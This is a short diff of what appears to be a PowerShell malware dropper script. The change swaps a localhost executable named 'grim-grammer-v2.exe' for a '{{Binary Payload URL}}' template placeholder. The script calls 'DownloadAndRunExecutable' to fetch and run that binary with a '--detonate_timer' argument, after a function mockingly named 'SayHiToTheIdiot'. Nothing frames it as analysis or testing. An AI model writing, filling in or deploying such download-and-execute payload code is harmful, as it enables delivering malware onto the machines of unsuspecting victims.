@@ -19,6 +19,6 @@ function DownloadAndRunExecutable {
 
 
 SayHiToTheIdiot
-DownloadAndRunExecutable -Url "http://localhost:3000/bin/grim-grammer-v2.exe" -CLIArguments @("--detonate_timer=300000ms")
+DownloadAndRunExecutable -Url "{{Binary Payload URL}}" -CLIArguments @("--detonate_timer=300000ms")
 
 
